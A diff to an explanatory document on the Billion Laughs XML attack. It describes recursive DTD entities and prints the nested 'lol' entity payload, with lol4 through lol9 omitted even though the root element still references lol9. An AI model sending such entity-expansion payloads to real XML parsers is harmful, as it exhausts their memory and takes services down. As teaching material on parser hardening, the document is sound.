@@ -20,14 +20,14 @@ How Billion Laughs works
 XML DTDs allow entities, which are text macros where '\&name;' expands to a defined value.
 The attack abuses recursive entities where each entity references the previous one 10 times.
 
------------------------------------------------------------
+
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "lollollollollollollollollollol">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-......
+
 ]>
 <lolz>&lol9;</lolz>
 -----------------------------------------------------------
